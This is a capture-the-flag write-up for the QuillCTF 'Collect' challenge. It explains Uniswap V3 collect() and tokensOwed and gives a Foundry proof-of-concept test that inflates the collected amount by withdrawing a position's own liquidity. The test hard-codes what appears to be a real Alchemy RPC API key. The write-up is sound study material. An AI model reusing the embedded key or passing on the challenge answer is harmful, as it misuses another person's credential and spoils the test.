---
title: QuillCTF - Collect
description: 2023 | Medium | DeFi Security
tags:
    - smart contract
    - uniswap v3
    - tokensowed
---

## Objective of CTF

> You have 1 LP from the owner.
> 
> At the end of the test, you collect commission from your LP.
> 
> But it's too small for you. Increase the amount of commission, which you can get.

[QuillCTF Challenges - Collect](https://quillctf.super.site/challenges/collect)

## Vulnerability Description

- The amount obtained from collect() is related to the amount of owed by the position

    ```js
    // UniswapV3Pool.sol
    function collect(
        address recipient,
        int24 tickLower,
        int24 tickUpper,
        uint128 amount0Requested,
        uint128 amount1Requested
    ) external override lock returns (uint128 amount0, uint128 amount1) {
        ...
        amount0 = amount0Requested > position.tokensOwed0 ? position.tokensOwed0 : amount0Requested;
        amount1 = amount1Requested > position.tokensOwed1 ? position.tokensOwed1 : amount1Requested;
        ...
    }
    ```

- We need to increase the amount of commission, i.e. position.tokensOwed
- We can simply decrease all the liquidity defiMaster has, and the amount of token will be added to the tokensOwed

    ```js
    if (amount0 > 0 || amount1 > 0) {
        (position.tokensOwed0, position.tokensOwed1) = (
            position.tokensOwed0 + uint128(amount0),
            position.tokensOwed1 + uint128(amount1)
        );
    }
    ```

## Proof of Concept

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "forge-std/Test.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {INonfungiblePositionManager} from "v3-periphery/interfaces/INonfungiblePositionManager.sol";
import {TickMath} from "v3-core/libraries/TickMath.sol";
import {IUniswapV3Factory} from "v3-core/interfaces/IUniswapV3Factory.sol";
import {IUniswapV3Pool} from "v3-core/interfaces/IUniswapV3Pool.sol";
import {ISwapRouter} from "v3-periphery/interfaces/ISwapRouter.sol";

// install:
// forge install Openzeppelin/openzeppelin-contracts
// forge install Uniswap/v3-periphery@0.8
// forge install Uniswap/v3-core@0.8

contract Token is ERC20 {
    constructor(
        string memory name,
        string memory symbol,
        uint initialMint
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialMint);
    }
}

contract NFTRent is Test {
    Token DogToken;
    Token CatToken;
    uint tokenId1;
    uint defiMasterLP;
    uint128 defiMasterLiquidity;
    uint liquidity;
    address owner = makeAddr("owner");
    address defiMaster = makeAddr("defiMaster");
    address user = makeAddr("user");
    uint24 poolFee = 3000;
    IUniswapV3Pool pool;
    ISwapRouter router =
        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    INonfungiblePositionManager nonfungiblePositionManager =
        INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    IUniswapV3Factory UNISWAP_FACTORY =
        IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);

    function setUp() public {
        vm.createSelectFork(
            "https://eth-mainnet.g.alchemy.com/v2/qtTzV89cHW8dqC9y-6BcCNYAPd22EAoU"
        );

        vm.startPrank(owner);
        DogToken = new Token("DogToken", "DogToken", 1000000 ether);
        CatToken = new Token("CatToken", "CatToken", 1000000 ether);
        // gift from owner to user
        DogToken.transfer(user, 10000 ether);
        CatToken.transfer(user, 10000 ether);
        // owner lp
        nonfungiblePositionManager.createAndInitializePoolIfNecessary(
            address(DogToken),
            address(CatToken),
            3000,
            1 << 96
        );

        pool = IUniswapV3Pool(
            UNISWAP_FACTORY.getPool(address(DogToken), address(CatToken), 3000)
        );
        DogToken.approve(address(nonfungiblePositionManager), 10000 ether);
        CatToken.approve(address(nonfungiblePositionManager), 10000 ether);
        INonfungiblePositionManager.MintParams
            memory params = INonfungiblePositionManager.MintParams({
                token0: address(DogToken),
                token1: address(CatToken),
                fee: poolFee,
                tickLower: -887220,
                tickUpper: 887220,
                amount0Desired: 1000 ether,
                amount1Desired: 1000 ether,
                amount0Min: 0,
                amount1Min: 0,
                recipient: owner,
                deadline: block.timestamp
            });

        nonfungiblePositionManager.mint(params);

        (defiMasterLP, defiMasterLiquidity, , ) = nonfungiblePositionManager
            .mint(params);

        // owner send to defiMaster LP 721 token
        nonfungiblePositionManager.safeTransferFrom(
            owner,
            defiMaster,
            defiMasterLP
        );
        vm.stopPrank();
    }

    function test_solution() public {
        // solution

        vm.startPrank(defiMaster);

        nonfungiblePositionManager.decreaseLiquidity(
            INonfungiblePositionManager.DecreaseLiquidityParams({
                tokenId: defiMasterLP,
                liquidity: defiMasterLiquidity,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp
            })
        );

        vm.stopPrank();

        // end solution

        vm.startPrank(user);
        CatToken.approve(address(router), 100 ether);
        DogToken.approve(address(router), 100 ether);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: address(CatToken),
                tokenOut: address(DogToken),
                fee: 3000,
                recipient: user,
                deadline: block.timestamp,
                amountIn: 100 ether,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });
        router.exactInputSingle(params);
        vm.stopPrank();

        vm.startPrank(defiMaster);

        INonfungiblePositionManager.CollectParams
            memory collectParams = INonfungiblePositionManager.CollectParams({
                tokenId: defiMasterLP,
                recipient: defiMaster,
                amount0Max: type(uint128).max,
                amount1Max: type(uint128).max
            });

        (, uint collectAmount1) = nonfungiblePositionManager.collect(
            collectParams
        );

        assertGt(collectAmount1, 298214374191364123);
        vm.stopPrank();
    }
}
```